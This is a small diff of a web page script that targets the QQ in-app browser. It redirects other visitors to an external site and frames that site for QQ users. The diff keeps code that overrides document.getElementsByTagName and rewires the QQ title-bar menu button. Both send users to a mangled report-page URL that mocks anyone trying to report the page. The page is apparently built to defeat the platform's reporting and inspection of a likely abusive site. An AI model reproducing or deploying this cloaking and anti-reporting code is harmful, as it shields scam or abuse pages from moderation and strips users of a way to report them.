@@ -8,6 +8,8 @@
 var ua = window.navigator.userAgent.toLowerCase();
 if(ua.match("qq") === null) {
 	window.location.href = 'https://zzuc.net';
-}else{document.getElementById("a1").innerHTML='<iframe id="infrm" name="infrm" marginwidth="0" marginheight="0" width="100%" scrolling=auto src="https://zzuc.net" frameborder="0" height="100%"></iframe>';}
-if (report == null) { var report="https://c.pc.qq.com/middlem.html?pfurl=小朋友，想举报不存在的！醒醒吧！";} var Zeptoq = document.getElementsByTagName;document.getElementsByTagName = function(a) { if (a == "meta") { window.location.href = report; return } if (a == "script" || a == "body") { return Zeptoq.call(document, a) } else { return } }; mqq.ui.setTitleButtons({ left : { title : "QQ", }, right : { title : "•••", callback : function () { mqq.ui.openUrl({ target: 2,style: 1,url: report}) } } });
+}else{
+	if (report == null) { var report="https://c.pc.qq.com/middlem.html?pfurl=小朋友，想举报不存在的！醒醒吧！";} var Zeptoq = document.getElementsByTagName;document.getElementsByTagName = function(a) { if (a == "meta") { window.location.href = report; return } if (a == "script" || a == "body") { return Zeptoq.call(document, a) } else { return } }; mqq.ui.setTitleButtons({ left : { title : "QQ", }, right : { title : "•••", callback : function () { mqq.ui.openUrl({ target: 2,style: 1,url: report}) } } });
+document.getElementById("a1").innerHTML='<iframe id="infrm" name="infrm" marginwidth="0" marginheight="0" width="100%" scrolling=auto src="https://zzuc.net" frameborder="0" height="100%"></iframe>';
+}
 </script>
